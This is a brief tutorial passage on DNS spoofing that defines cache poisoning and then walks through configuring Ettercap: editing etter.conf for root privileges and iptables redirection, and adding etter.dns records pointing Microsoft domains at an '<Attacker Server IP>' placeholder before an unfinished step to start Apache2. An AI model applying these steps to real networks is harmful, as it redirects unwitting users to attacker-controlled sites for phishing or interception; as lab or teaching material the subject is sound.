## DNS Spoofing

Domain Name Server (DNS) spoofing, or DNS cache poisoning, is an attack involving manipulating DNS records to redirect users toward a fraudulent, malicious website that may resemble the user's intended destination.

## Practical

### Modify etter.conf

```
sudo nano /etc/ettercap/etter.conf

# Change the [privs] value to 0
ec_uid = 0
ec_gid = 0

# Now scroll down until you find the heading that says Linux and under that remove both the # signs below where it says "if you use iptables".

```

### Modify etter.dns

```
sudo nano /etc/ettercap/etter.dns

# Add the following lines for dns poisoning
microsoft    A    <Attacker Server IP>
*.mirosoft    A    <Attacker Server IP>
```

### Start Apache2 Server
